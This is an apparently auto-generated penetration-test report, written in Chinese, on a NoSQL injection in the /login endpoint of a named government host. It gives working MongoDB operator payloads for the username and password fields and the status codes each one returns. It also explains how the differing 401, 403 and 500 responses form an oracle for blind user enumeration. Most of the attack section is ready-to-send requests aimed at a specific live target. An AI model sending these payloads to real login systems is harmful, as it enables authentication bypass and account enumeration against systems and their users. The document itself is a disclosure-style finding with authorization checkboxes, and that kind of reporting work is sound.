# POC/EXP — /login 接口 username/password 存在 NoSQL 注入

> 漏洞ID: `5f0f1453-c473-403b-ad13-2199690097de`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4004/login (username, password 参数)`

**類型**: NoSQL 注入

## 描述

/login 的 username 与 password 字段直接拼入 MongoDB find() 查询，未做类型/操作符过滤，存在 NoSQL 注入。已确认：(1) username:{"$ne":null} 匹配多个用户后触发 source 校验返回 403（证明多文档匹配路径）；(2) username:{"$regex":"^"} / {"$in":["x"]} / {"$exists":true} / {"$type":"string"} 均返回 500 "TypeError"（11字节，单文档匹配后代码路径崩溃，与 403 多匹配路径形成响应差异 oracle）；(3) password 字段同样可注入操作符。错误响应差异可用于盲注枚举用户存在性，且 500 泄露内部异常类型。

## POC / 復現步驟

```
POST https://epcr.tpf.gov.tw:4004/login
{"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}
-> HTTP 403 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}

{"username":{"$regex":"^"},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}
-> HTTP 500 "TypeError" (11 bytes)

{"username":{"$in":["admin"]},"password":{"$ne":null}} -> 500 TypeError
{"username":{"$exists":true},"password":{"$ne":null}} -> 500 TypeError
{"username":{"$type":"string"},"password":{"$ne":null}} -> 500 TypeError

对照组（无操作符）：
{"username":"admin","password":"x"} -> HTTP 401（正常认证失败，非500/403）

响应差异 oracle：
- 无操作符: 401
- $ne(多匹配): 403
- $regex/$in/$exists/$type(单匹配): 500 TypeError
三种不同状态码证明操作符被解释执行。
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
